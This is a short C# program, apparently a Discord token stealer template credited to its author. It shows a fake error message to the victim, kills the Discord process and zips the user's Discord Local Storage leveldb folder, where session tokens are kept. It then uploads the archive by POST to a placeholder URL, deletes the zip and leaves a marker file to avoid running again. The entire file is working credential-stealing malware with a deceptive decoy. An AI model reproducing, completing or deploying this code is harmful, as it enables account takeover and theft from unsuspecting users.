// Created By AhmedViruso

using System.IO.Compression;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.IO;
using System;

static class Program
{
    static void Main()
    {
        var Discord = "Empty";

        Thread.Sleep(500);
        MessageBox.Show("Put Your Fake Error Message Here", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

        string DirPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\";
        string Check = DirPath + "Check"; 

        if (File.Exists(Check) != true)
        {
            try
            {
                var Proc = Process.GetProcessesByName("discord");
                Discord = Proc[0].MainModule.FileName;
                foreach (var Pro in Proc)
                {
                    Pro.Kill();
                }
                Thread.Sleep(250);
            }
            catch { }

            Random Rand = new Random();
            string ZipPath = DirPath + Rand.Next(9999, 99999) + " - " + Environment.UserName + ".zip";

            try
            {
                ZipFile.CreateFromDirectory(DirPath, ZipPath);
            }
            catch { }

            try
            {
                Process.Start(Discord);
            }
            catch { }

            for (int I = 0; I < 2; I++) // For Make Sure That The Zip File Is Uploaded
            {
                try
                {
                    using (WebClient Client = new WebClient())
                    {
                        Client.Headers.Add("Content-Type", "application/zip");
                        Client.UploadFile("Your Url", "POST", ZipPath);
                    }
                }
                catch{}
            }

            try
            {
                File.Delete(ZipPath);
                File.Create(Check);
            }
            catch { }

        }
    }
}